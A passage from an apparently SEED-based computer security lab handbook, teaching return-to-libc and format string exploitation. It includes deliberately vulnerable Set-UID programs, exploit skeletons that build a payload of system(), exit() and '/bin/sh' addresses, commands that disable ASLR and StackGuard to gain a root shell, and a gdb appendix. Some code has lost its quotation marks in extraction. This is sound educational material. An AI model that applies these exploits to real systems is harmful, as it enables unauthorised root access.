- Therefore the range of addresses that we need to guess is actually quite small.

Finding the starting point of the malicious code. If you can accurately calculate the address of
buffer[], you should be able to accurately calculate the starting point of the malicious code. Even if you
cannot accurately calculate the address (for example, for remote programs), you can still guess. To improve
the chance of success, we can add a number of NOPs to the beginning of the malicious code; therefore, if we
can jump to any of these NOPs, we can eventually get to the malicious code. The following figure depicts
the attack.

## Page 23

Storing an long integer in a buffer: In your exploit program, you might need to store an long integer
(4 bytes) into an buffer starting at buffer[i]. Since each buffer space is one byte long, the integer will
actually occupy four bytes starting at buffer[i] (i.e., buffer[i] to buffer[i+3]). Because buffer and long are of
different types, you cannot directly assign the integer to buffer; instead you can cast the buffer+i into an
long pointer, and then assign the integer. The following code shows how to assign an long integer to a
buffer starting at buffer[i]:

```c
char buffer[20];
long addr = 0xFFEEDD88;
```

```c
long *ptr = (long *) (buffer + i);
*ptr = addr;
```

## Page 24

## 4 Major Task: Return-to-libc Attack

Introduction The learning objective of this chapter is for you to gain the first-hand experience on an
interesting variant of buffer-overflow attack; this attack can bypass an existing protection scheme currently
implemented in major Linux operating systems. A common way to exploit a buffer-overflow vulnerability
is to overflow the buffer with a malicious shellcode, and then cause the vulnerable program to jump to the
shellcode that is stored in the stack. To prevent these types of attacks, some operating systems allow system
administrators to make stacks non-executable; therefore, jumping to the shellcode will cause the program
to fail.
Unfortunately, the above protection scheme is not fool-proof; there exists a variant of buffer-overflow attack
called the return-to-libc attack, which does not need an executable stack; it does not even use shell code.
Instead, it causes the vulnerable program to jump to some existing code, such as the system() function in
the libc library, which is already loaded into the memory.

In this chapter, you are given a program with a buffer-overflow vulnerability; their task is to develop a
return-to-libc attack to exploit the vulnerability and finally to gain the root privilege. In addition to
the attacks, you will be guided to walk through several protection schemes that have been implemented in
Ubuntu to counter against the buffer-overflow attacks. You need to evaluate whether the schemes work or
not and explain why. The following topics will be covered:
- Buffer overflow vulnerability

- Stack layout in a function invocation and Non-executable stack
- Return-to-libc attack and Return-Oriented Programming (ROP)

### 4.1 Initial Setup

Package Prerequisites. Before starting this task, make sure the following packages are installed. These
are required for 32-bit compilation, debugging, and the shell symlink trick. If any package is missing, the
lab will not work.

```c
$ sudo apt update
$ sudo apt install gcc-multilib gdb zsh
```

Address Space Randomization. As it introduced in Chapter 2, guessing addresses is one of the critical
steps of buffer-overflow attacks. In this chapter, we still firstly disable these features using the following
commands:

```c
$ sudo sysctl -w kernel.randomize_va_space=0
```

Verify that the setting took effect (it must show 0):

```c
$ cat /proc/sys/kernel/randomize_va_space
0
```

Note: This setting resets to its default value after every reboot. You must re-run the sysctl command
each time you restart your machine.

## Page 25

The StackGuard Protection Scheme. Also, we turn off the Stack Guard when compiling. For example,
to compile a program example.c with Stack Guard disabled, you may use the following command:

```c
$ gcc -m32 -fno-stack-protector example.c
```

Non-Executable Stack. Because the objective of this chapter is to show that the non-executable stack
protection does not work, you should always compile your program using the "-z noexecstack" option in
this part.:

#for executable stack
```c
$ gcc -m32 -z execstack -o test test.c
```

#for non-executable stack
```c
$ gcc -m32 -z noexecstack -o test test.c
```

Because the objective of this lab is to show that the non-executable stack protection does not work, you
should always compile your program using the “-z noexecstack” option in this lab.

32-bit Compilation. As with the buffer overflow section, all programs in this section must be compiled
with the -m32 flag to produce 32-bit binaries. All compilation commands below already include this flag.

Disabling PIE (Position Independent Executables). Modern versions of gcc (since Ubuntu 17.10)
produce Position Independent Executables (PIE) by default. Although disabling ASLR (randomize va space=0)
also pins PIE addresses, we add the -no-pie flag to all compilation commands in this lab for robustness.
This ensures the binary is loaded at a fixed address regardless of the system’s default settings. All compi-
lation commands below already include this flag.

Configuring /bin/sh. In the recent versions of Ubuntu OS, the /bin/sh symbolic link points to the
/bin/dash shell. The dash program, as well as bash, has implemented a security countermeasure that
prevents itself from being executed in a Set-UID process. Basically, if dash detects that it is executed in
a Set-UID process, it immediately changes the effective user ID to the process’s real user ID, essentially
dropping the privilege. Since our victim program is a Set-UID program, and our attack relies on running
/bin/sh, the countermeasure in /bin/dash makes our attack more difficult. Therefore, we will link /bin/sh
to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit
more effort, the countermeasure in /bin/dash can be easily defeated). We have installed a shell program
called zsh in our Ubuntu 20.04 VM. The following commands link /bin/sh to zsh (if zsh is not installed,
run sudo apt install zsh first):
```c
$ sudo ln -sf /bin/zsh /bin/sh
```

Troubleshooting Common Issues
If your attack does not work, check the following before asking for help:

1. Compilation fails with “cannot find -lgcc”: You are missing 32-bit libraries. Run sudo apt
install gcc-multilib.
2. “/bin/zsh: not found”: Install zsh with sudo apt install zsh, then re-run the ln -sf command.

## Page 26

3. Segfault immediately in gdb: You forgot to create badfile. Run touch badfile first.

4. Addresses from gdb don’t match runtime: Make sure (a) ASLR is off (cat /proc/sys/kernel/randomize va space
shows 0), (b) you compiled with -no-pie, and (c) you used the same -DBUFSIZE= value for both the
gdb build and the Set-UID build.
5. Got a shell but not root: You forgot to link /bin/sh to /bin/zsh, or the Set-UID bit was lost
(re-run sudo chown root retlib && sudo chmod 4755 retlib).

6. Environment variable address is wrong: The helper program that prints the address of MYSHELL
must have the same filename length as retlib (6 characters).
### 4.2 The Vulnerable Program

```c
/* retlib.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#ifndef BUFSIZE
#define BUFSIZE 22
#endif
```

```c
int bof(FILE *badfile)
{
char buffer[BUFSIZE];
/* The following statement has a buffer overflow problem */
fread(buffer, sizeof(char), 300, badfile);
return 1;
}
int main(int argc, char **argv)
{
FILE *badfile;
char dummy[BUFSIZE*5]; memset(dummy, 0, BUFSIZE*5);
badfile = fopen(badfile, r );
bof(badfile);
printf(Returned Properly\n);
fclose(badfile);
return 1;
}
The above program has a buffer overflow vulnerability. It first reads an input of size 300 bytes from a file
called badfile into a buffer of size BUFSIZE, which is less than 300. Since the function fread() does not
check the buffer boundary, a buffer overflow will occur. This program is a root-owned Set-UID program, so
if a normal user can exploit this buffer overflow vulnerability, the user might be able to get a root shell.
It should be noted that the program gets its input from a file called badfile, which is provided by users.
Therefore, we can construct the file in a way such that when the vulnerable program copies the file contents
into its buffer, a root shell can be spawned.
Compilation. Let us first compile the code and turn it into a root-owned Set-UID program. Do not
forget to include the -fno-stack-protector option (for turning off the StackGuard protection) and the ”-z
noexecstack” option (for turning on the non-executable stack protection). It should also be noted that
changing ownership must be done before turning on the Set-UID bit, because ownership changes cause the
Set-UID bit to be turned off.
```

## Page 27

```c
$ gcc -m32 -DBUFSIZE=? -no-pie -o retlib -z noexecstack -fno-stack-protector retlib.c
$ sudo chown root retlib
$ sudo chmod 4755 retlib
```

-DBUFSIZE initializes BUFSIZE with a user-specified value (up to you to determine) in the section
between #ifndef and #endif. You can replace ? with a random integer between 12 and 200 (if it is too
small, there could be problems).
Important: Remember the BUFSIZE value you chose — you must use the exact same value when
compiling the debug version below and when building your exploit. Using a different value will change the
stack layout and cause your attack to fail.
### 4.3 Exploiting the Vulnerability

In Linux, when a program runs, the libc library will be loaded into memory. When the memory address
randomization is turned off, for the same program, the library is always loaded in the same memory address
(for different programs, the memory addresses of the libc library may be different). Therefore, we can easily
find out the address of system() using a debugging tool such as gdb. Namely, we can debug the target
program retlib. Even though the program is a root-owned Set-UID program, we can still debug it, except
that the privilege will be dropped (i.e., the effective user ID will be the same as the real user ID). Inside
gdb, we need to type the run command to execute the target program once, otherwise, the library code will
not be loaded. We use the p command (or print) to print out the address of the system() and exit() functions
(we will need exit() later on).
```c
$ touch badfile  ### IMPORTANT: badfile must exist before running gdb
$ gcc -m32 -DBUFSIZE=? -no-pie -g -o retlib_gdb -z noexecstack \
-fno-stack-protector retlib.c
$ gdb -q retlib_gdb ### Use "Quiet" mode
Reading symbols from retlib_gdb...done.
(gdb) run
......
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e42da0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e369d0 <__GI_exit>
(gdb) quit
It should be noted that even for the same program, if we change it from a Set-UID program to a non-
Set-UID program, the libc library may not be loaded into the same location. Therefore, when we debug the
program, we need to debug the target Set-UID program; otherwise, the address we get may be incorrect.
```

### 4.4 Putting the shell string in the memory

Our attack strategy is to jump to the system() function and get it to execute an arbitrary command. Since
we would like to get a shell prompt, we want the system() function to execute the ”/bin/sh” program.
Therefore, the command string ”/bin/sh” must be put in the memory first and we have to know its address
```c
(this address needs to be passed to the system() function). There are many ways to achieve these goals;
we choose a method that uses environment variables. Students are encouraged to use other approaches.
When we execute a program from a shell prompt, the shell actually spawns a child process to execute the
program, and all the exported shell variables become the environment variables of the child process. This
creates an easy way for us to put some arbitrary string in the child process’s memory. Let us define a new
shell variable MYSHELL, and let it contain the string ”/bin/sh”. From the following commands, we can
```

## Page 28

verify that the string gets into the child process, and it is printed out by the env command running inside
the child process.

```c
$ export MYSHELL=/bin/sh
$ env | grep MYSHELL
MYSHELL=/bin/sh
```

We will use the address of this variable as an argument to system() call. The location of this variable in
the memory can be found out easily using the following program:

```c
void main(){
char* shell = getenv("MYSHELL");
if (shell)
printf("%x\n", (unsigned int)shell);
}
```

If the address randomization is turned off, you will find out that the same address is printed out.
However, when you run the vulnerable program retlib, the address of the environment variable might not
be exactly the same as the one that you get by running the above program; such an address can even change
when you change the name of your program (the number of characters in the file name makes a difference).
The good news is, you must name the helper program with the same length as “retlib” (6 characters),
e.g., “env555”. Also compile it with the same flags:
```c
$ gcc -m32 -no-pie -o env555 env555.c
```

### 4.5 Exploiting the Vulnerability
We are ready to create the content of badfile. Since the content involves some binary data (e.g., the address
of the libc functions), we can use C or Python to do the construction.

Using Python. We provide you with a skeleton of the code, with the essential parts left for you to fill
out.

## Page 29

#!/usr/bin/python3
import sys

# Fill content with non-zero values
```c
content = bytearray(0xaa for i in range(250))
sh_addr = 0x00000000 # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
```

```c
system_addr = 0x00000000 # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
```

```c
exit_addr = 0x00000000 # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
```

# Save content to a file
with open("badfile", "wb") as f:
f.write(content)
You need to figure out the three addresses and the values of X, Y, and Z. If your values are incorrect,
your attack might not work. In your report, you need to describe how you decide the values for X, Y and
Z. Either show us your reasoning or, if you use a trial-and-error approach, show your trials.

Using C. We provide you with a skeleton of the code, with the essential parts left for you to fill out.

```c
/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
char buf[250];
FILE *badfile;
badfile = fopen(./badfile, w );
```

```c
/* You need to decide the addresses and
the values for X, Y, Z. The order of the following
three statements does not imply the order of X, Y, Z.
Actually, we intentionally scrambled the order. */
*(long *) &buf[X] = some address ; // /bin/sh
*(long *) &buf[Y] = some address ; // system()
*(long *) &buf[Z] = some address ; // exit()
fwrite(buf, sizeof(buf), 1, badfile);
fclose(badfile);
}
```

You need to figure out the values for those addresses, as well as to find out where to store those addresses.
If you incorrectly calculate the locations, your attack might not work.

## Page 30

After you finish the above program, compile and run it; this will generate the contents for badfile. Run
the vulnerable program retlib. If your exploit is implemented correctly, when the function bof returns, it
will return to the system() libc function, and execute system("/bin/sh"). If the vulnerable program is
running with the root privilege, you can get the root shell at this point.

It should be noted that the exit() function is not very necessary for this attack; however, without this
function, when system() returns, the program might crash, causing suspicions.

```c
$ gcc -m32 -no-pie -o exploit exploit.c
$./exploit   // create the badfile
$./retlib    // launch the attack by running the vulnerable program
# whoami
root
#
```

Step 2: Attack without exit(). After your attack in Step 1 is successful, modify your exploit code
to remove the address of exit() from badfile (e.g., replace it with a dummy value or remove the cor-
responding line). Rerun the exploit and then run retlib again. Observe what happens when system()
returns.

Step 3: Changing the program name. After your attack in Step 1 is successful, rename retlib to a
different name whose length differs from the original, e.g., newretlib. Without regenerating or changing
the content of badfile, run the renamed program. Observe whether the attack still succeeds. Recall that
the address of the environment variable MYSHELL depends on the length of the program name.
### What to Report

- Your completed exploit code (C or Python) and a brief explanation of your solution.
- The addresses you found for system(), exit(), and the "/bin/sh" string, and how you obtained
them (e.g., using gdb).

- How you determined the values for X, Y, and Z. Either show your reasoning or, if you used a trial-and-
error approach, show your trials.
- Screenshots showing the successful attack (Step 1): running the exploit, then running retlib, and
obtaining a root shell.

- Screenshots and explanation for Step 2: what happens when the exit() address is removed from
badfile.
- Screenshots and explanation for Step 3: whether the attack succeeds after renaming retlib to a
different-length name, and why or why not.

### 4.6 Address Randomization

In this task, let us turn on the Ubuntu’s address randomization protection. We run the same attack devel-
oped in Subsection 4.5 Exploiting the Vulnerability [8 Marks]
Report: Can you get a shell? If not, what is the problem? How does the address ran-
domization make your return-to-libc attack difficult? You can use the following instructions to turn
on the address randomization:

## Page 31

```c
$ sudo sysctl -w kernel.randomize_va_space=2
```

If you plan to use gdb to conduct your investigation, you should be aware that gdb by default disables
the address space randomization for the debugged process, regardless of whether the address randomization
is turned on in the underlying operating system or not. Inside the gdb debugger, you can run “show disable-
randomization” to see whether the randomization is turned off or not. You can use “set disable-randomization
on” and “set disable-randomization off” to change the setting.
### What to Report

- Screenshots showing whether the attack succeeds or fails with address randomization enabled.
- Explanation of how address randomization makes the return-to-libc attack difficult.

### 4.7 Stack Guard Protection

In this task, let us turn on the Ubuntu’s Stack Guard protection. Please remember to turn off the address
randomization protection. We run the same attack developed in Subsection 4.5.

Report: Can you get a shell? If not, what is the problem? How does the Stack Guard
protection make your return-to-libc attack difficult? You can use the following instructions to
compile your program with the Stack Guard protection turned on.
```c
$ gcc -m32 -DBUFSIZE=? -no-pie -o retlib -z noexecstack retlib.c
$ sudo chown root retlib
$ sudo chmod 4755 retlib
```

### What to Report
- The compilation command you used (without -fno-stack-protector).
- Screenshots showing whether the attack succeeds or fails with Stack Guard enabled.

- Explanation of how Stack Guard makes the return-to-libc attack difficult.

### 4.8 Guidelines: Understanding the function call mechanism

#### 4.8.1 Find out the addresses of libc functions
To find out the address of any libc function, you can use the following gdb commands (a.out is an arbitrary
program):

```c
$ gdb a.out
```

(gdb) b main
(gdb) r
(gdb) p system
$1 = {<text variable, no debug info>} 0x9b4550 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0x9a9b70 <exit>
From the above gdb commands, we can find out that the address for the system() function is 0x9b4550,
and the address for the exit() function is 0x9a9b70. The actual addresses in your system might be different
from these numbers.

## Page 32

#### 4.8.2 Putting the shell string in the memory

One of the challenge in this lab is to put the string "/bin/sh" into the memory, and get its address. This
can be achieved using environment variables.
When a C program is executed, it inherits all the environment variables from the shell that executes
it. The environment variable SHELL points directly to /bin/bash and is needed by other programs, so
we introduce a new shell variable MYSHELL and make it point to zsh

```c
$ export MYSHELL=/bin/sh
```

We will use the address of this variable as an argument to system() call. The location of this variable in
the memory can be found out easily using the following program:

```c
void main(){
char* shell = getenv("MYSHELL");
if (shell)
printf("%x\n", (unsigned int)shell);
}
```

If the address randomization is turned off, you will find out that the same address is printed out. However,
when you run the vulnerabile program retlib, the address of the environment variable might not be exactly
the same as the one that you get by running the above program; such an address can even change when
you change the name of your program (the number of characters in the file name makes difference). The
good news is, the address of the shell will be quite close to what you print out using the above program.
Therefore, you might need to try a few times to succeed.

## Page 33

## 5 Major Task: Format String Vulnerability

The printf() function in C is used to print out a string according to a format. Its first argument is called
format string, which defines how the string should be formatted. Format strings use placeholders marked
by the % character for the printf() function to fill in data during the printing. The use of format strings
is not only limited to the printf() function; many other functions, such as sprintf(), fprintf(), and
scanf(), also use format strings. Some programs allow users to provide the entire or part of the contents
in a format string. If such contents are not sanitized, malicious users can use this opportunity to get the
program to run arbitrary code. A problem like this is called format string vulnerability.
The objective of this lab is for you to gain the first-hand experience on format string vulnerabilities by
putting what they have learned about the vulnerability from class into actions. You will be given a program
with a format string vulnerability; your task is to exploit the vulnerability to achieve the following damage:
(1) crash the program, (2) read the internal memory of the program, (3) modify the internal memory of
the program, and most severely, (4) inject and execute malicious code using the victim program’s privilege.
The last consequence is very dangerous if the vulnerable program is a privileged program, such as a root
daemon, because that can give attackers the root access of the system.
Note that the binary code of the program (Set-UID) is only readable/executable by you, and there is no way
you can modify the code. Namely, you need to achieve the above objectives without modifying the vulnerable
code. However, you do have a copy of the source code, which can help you design your attacks. The program
first asks for a decimal integer via scanf("%d", &int input), and then asks for a string via scanf("%s",
user input). The string is passed directly to printf(user input), which is the vulnerable call. You will
exploit this vulnerability in the following four subtasks.
```c
/* vul_prog.c */
#include<stdio.h>
#include<stdlib.h>
#define SECRET1 0x44
#define SECRET2 0x55
int main(int argc, char *argv[])
{
char user_input[100];
int *secret;
int int_input;
int a, b, c, d; /* other variables, not used here.*/
/* The secret value is stored on the heap */
secret = (int *) malloc(2*sizeof(int));
/* getting the secret */
secret[0] = SECRET1; secret[1] = SECRET2;
```

printf(The variable secret's address is 0x%8x (on stack)\n,
```c
(unsigned int)&secret);
printf(The variable secret's value is 0x%8x (on heap)\n,
(unsigned int)secret);
printf(secret[0]'s address is 0x%8x (on heap)\n,
(unsigned int)&secret[0]);
printf(secret[1]'s address is 0x%8x (on heap)\n,
(unsigned int)&secret[1]);
printf(Please enter a decimal integer\n);
scanf( %d , &int_input); /* getting an input from user */
printf(Please enter a string\n);
scanf( %s , user_input); /* getting a string from user */
```

## Page 34

```c
/* Vulnerable place */
printf(user_input);
printf(\n );
```

```c
/* Verify whether your attack is successful */
printf(The original secrets: 0x%x -- 0x%x\n, SECRET1, SECRET2);
printf(The new secrets: 0x%x -- 0x%x\n, secret[0], secret[1]);
return 0;
}
```

Hints: From the printout, you will find out that secret[0] and secret[1] are located on the heap, i.e.,
the actual secrets are stored on the heap. We also know that the address of the first secret (i.e., the value
of the variable secret) can be found on the stack, because the variable secret is allocated on the stack. In
other words, if you want to overwrite secret[0], its address is already on the stack; your format string can
take advantage of this information. However, although secret[1] is just right after secret[0], its address
is not available on the stack. This poses a major challenge for your format-string exploit, which needs to
have the exact address right on the stack in order to read or write to that address.
### 5.1 Crash the program

Your task is to provide an input to the format string vulnerability in vul prog that causes the program
to crash (e.g., a segmentation fault). Think about what happens when printf tries to access memory
addresses that it should not.

### What to Report
- The input string you used to crash the program.

- Screenshots showing the crash.
- Brief explanation of why this input causes the program to crash.

### 5.2 Print out the secret[1] value

Your task is to use the format string vulnerability to read the value of secret[1] from memory. Note that
the program prints the address of secret[1] for you. You need to craft a format string that causes printf
to read and display the value stored at that address. You may use the decimal integer input (int input)
as part of your strategy.

### What to Report
- The decimal integer and format string you provided as input.
- Screenshots showing the secret[1] value printed out.

- Brief explanation of how your format string reads the value from the target address.

### 5.3 Modify the secret[1] value

Your task is to use the format string vulnerability to modify the value of secret[1]. The %n format
specifier in printf writes the number of characters printed so far to an address on the stack. You need to
figure out how to make printf write to the address of secret[1].

## Page 35

### What to Report

- The decimal integer and format string you provided as input.
- Screenshots showing secret[1] was modified (compare original vs. new value in the program output).

- Brief explanation of how %n writes to the target address.

### 5.4 Modify the secret[1] value to a pre-determined value, i.e., 80 in decimal
Building on the previous task, your goal is now to change secret[1] to a specific value: 0x50 (80 in
decimal). To control the exact value written by %n, you need to carefully control how many characters
printf prints before reaching the %n specifier (e.g., by using width specifiers like %Nx).

### What to Report

- The decimal integer and format string you provided as input.
- Screenshots showing secret[1] was changed to exactly 0x50 (80 in decimal).

- Brief explanation of how you controlled the exact value written by %n.

## Page 36

## 6 Acknowledgment

This exercise is largely adopted and modified from the SEED project (Developing Instructional Laboratories
for Computer Security Education), at the website
https://seedsecuritylabs.org/
as well as from Computer & Internet Security: A Hands-on Approach, 2nd Edition (2019), by Wenliang Du.

## Page 37

Appendix

GNU Debugger

The GNU debugger gdb is a very powerful tool that is extremely useful all around computer science, and
MIGHT be useful for this task. A basic gdb workflow begins with loading the executable in the debugger:
gdb executable

You can then start running the problem with:

```c
$ run [arguments-to-the-executable]
```

(Note, here we have changed gdbO˜ s default prompt of (gdb) to $).

In order to stop the execution at a specific line, set a breakpoint before issuing the “run” command.
When execution halts at that line, you can then execute step-wise (commands next and step) or continue
(command continue) until the next breakpoint or the program terminates.

```c
$ break line-number or function-name
$ run [arguments-to-the-executable]
$ step   # branch into function calls
$ next   # step over function calls
$ continue # execute until next breakpoint or program termination
Once execution stops, you will find it useful to look at the stack backtrace and the layout of the current
stack frame:
```

```c
$ backtrace
$ info frame 0
$ info registers
```

You can navigate between stack frames using the up and down commands. To inspect memory at a particular
location, you can use the x/FMT command

```c
$ x/16 $esp
$ x/32i 0xdeadbeef
$ x/64s &buf
```

where the FMT suffix after the slash indicates the output format. Other helpful commands are disassemble
and info symbol. You can get a short description of each command via

```c
$ help command
```

In addition, Neo left a concise summary of all gdb commands at:

http://vividmachines.com/gdbrefcard.pdf

You may find it very helpful to dump the memory image (O` coreO´ ) of a program that crashes. The core
captures the process state at the time of the crash, providing a snapshot of the virtual address space, stack
frames, etc., at that time. You can activate core dumping with the shell command:

## Page 38

```c
% ulimit -c unlimited
```

A crashing program then leaves a file core in the current directory, which you can then hand to the debugger
together with the executable:

gdb executable core
```c
$ bt     # same as backtrace
$ up     # move up the call stack
$ i f 1  # same as "info frame 1"
$ ...
Lastly, here is how you step into a second program bar that is launched by a first program foo:
```

gdb -e foo -s bar # load executable foo and symbol table of bar
```c
$ set follow-fork-mode child # enable debugging across programs
$ b bar:f              # breakpoint at function f in program bar
$ r                    # run foo and break at f in bar
```
